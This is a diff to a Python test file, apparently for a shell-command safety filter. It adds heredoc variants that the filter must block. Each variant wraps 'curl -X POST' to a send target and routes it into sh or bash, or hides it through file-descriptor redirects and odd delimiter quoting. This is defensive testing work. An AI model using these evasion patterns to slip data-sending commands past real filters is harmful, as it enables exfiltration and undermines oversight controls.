@@ -578,7 +578,16 @@ class RuleGQuotedHeredocBodies(Base):
                     "cat <<'EOF' > >(bash)\ncurl -X POST %s\nEOF" % self.SEND,
                     "cat <<'EOF' | tee >(sh)\ncurl -X POST %s\nEOF" % self.SEND,
                     "cat <<'EOF' 2>&3\ncurl -X POST %s\nEOF" % self.SEND,
-                    "sort --compress-program=sh -S 1K <<'EOF'\ncurl -X POST %s\nEOF" % self.SEND):
+                    "sort --compress-program=sh -S 1K <<'EOF'\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' >&10\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' >&$fd\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' > /dev/fd/3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' > /proc/self/fd/3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' &>/tmp/x\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat {fd}<<'EOF'\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'E\\\\OF'\ncurl -X POST %s\nE\\OF" % self.SEND,
+                    "cat <<\"E\\\"OF\"\ncurl -X POST %s\nE\"OF" % self.SEND,
+                    "cat <<'E$OF'\ncurl -X POST %s\nE$OF" % self.SEND):
             self.blocked(cmd, "G")
 
     def test_the_unclear_cases_are_refused(self):
